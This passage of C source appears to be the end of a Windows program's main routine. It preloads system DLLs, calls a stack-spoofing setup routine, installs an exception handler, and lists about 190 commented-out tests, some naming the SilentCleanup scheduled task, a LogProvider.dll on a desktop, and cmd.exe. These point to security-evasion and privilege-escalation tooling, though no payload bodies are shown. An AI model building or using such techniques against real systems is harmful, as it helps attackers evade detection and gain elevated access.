	LoadLibraryW(L"vrfcore.dll");
	LoadLibraryW(L"win32u.dll");
	LoadLibraryW(L"winhttp.dll");
	LoadLibraryW(L"wtsapi32.dll");
	LoadLibraryW(L"RPCRT4.dll");
	LoadLibraryW(L"shell32.dll");
	LoadLibraryW(L"KernelBase.dll");
	LoadLibraryW(L"userenv.dll");
	LoadLibraryW(L"ktmw32.dll");
	LoadLibraryW(L"wS2_32.dll");
	LoadLibraryW(L"mscoree.dll");

	if (!SetupStackSpoofing()) {
		return -1;
	}

	RtlAddVectoredExceptionHandler(1, VectoredExceptionHandler);
	/*hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageLoop, hInstance, 0, NULL);
	if (hThread == NULL) {
		LOG_ERROR("CreateThread", GetLastError())
		goto CLEANUP;
	}*/

	Sleep(2000);
	//StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
	//test1();
	//test2(L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
	//test3(L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
	//test5();
	//test6();
	//test7();
	//test8();
	//test9();
	//test10();
	//test11();
	//test12();
	//test13();
	//test14();
	//test15();
	//test16();
	//test17();
	//test18();
	//test19();
	//test20();
	//test21("C:\\Windows\\System32\\cmd.exe");
	//test22();
	//test23();
	//test24();
	//test25();
	//test26();
	//test27();
	//test28();
	//test29();
	//test30();
	//test31();
	//test32();
	//test33();
	//test34();
	//test35();
	//test36();
	//test37();
	//test38();
	//test39();
	//test40();
	//test41();
	//test42();
	//test43();
	//test44();
	//test45();
	//test46();
	//test47();
	//test48();
	//test49();
	//test50();
	//test51();
	//test52();
	//test53();
	//test54();
	//test55();
	//test56();
	//test57();
	//test58();
	//test59();
	//test60();
	//test61();
	//test62();
	//test64();
	//test65();
	//test66();
	//test67();
	//test68();
	//test69();
	//test70();
	//test71();
	//test72();
	//test73();
	//test74();
	//test75();
	//test76();
	//test77();
	//test78();
	//test79();
	//test80();
	//test81();
	//test82();
	//test83();
	//test84();
	//test85();
	//test86();
	//test87();
	//test88();
	//test89();
	//test90();
	//test91();
	//test92();
	//test93();
	//test94();
	//test95();
	//test96();
	//test97();
	//test98();
	//test99();
	//test100();
	//test101();
	//test102();
	//test103();
	//test104();
	//test105();
	//test106();
	//test108();
	//test109();
	//test110();
	//test111();
	//test112();
	//test113();
	//test114();
	//test115();
	//test116();
	//test117();
	//test118();
	//test119();
	//test120();
	//test121();
	//test122();
	//test124();
	//test125();
	//test126();
	//test127();
	//test128();
	//test129();
	//test130();
	//test131();
	//test132();
	//test133();
	//test134();
	//test135();
	//test136();
	//test137();
	//test138();
	//test139();
	//test140();
	//test141();
	//test142();
	//test143();
	//test144();
	//test145();
	//test146();
	//test147();
	//test148();
	//test149();
	//test150();
	//test151();
	//test152();
	//test153();
	//test154();
	//test155();
	//test156();
	//test157();
	//test158();
	//test159();
	//test160();
	//test161();
	//test162();
	//test163();
	//test164();
	//test165();
	//test166();
	//test167();
	//test168();
	//test169();
	//test170();
	//test171();
	//test172();
	//test173();
	//test174();
	//test175();
	//test176();
	//test177();
	//test178();
	//test179();
	//test180();
	//test181();
	//test182();
	//test183();
	//test184();
	//test185();
	//test186();
	//test187();
	//test188();
	//test189();
	//test190();
	//test191();
	//test192();
	//test193();
	//test194();
	//test195();
	//test196();
	//test197();
	Final();
	//WaitForSingleObject(hThread, INFINITE);
CLEANUP:
	if (hThread != NULL) {
		CloseHandle(hThread);
	}

	return 0;
}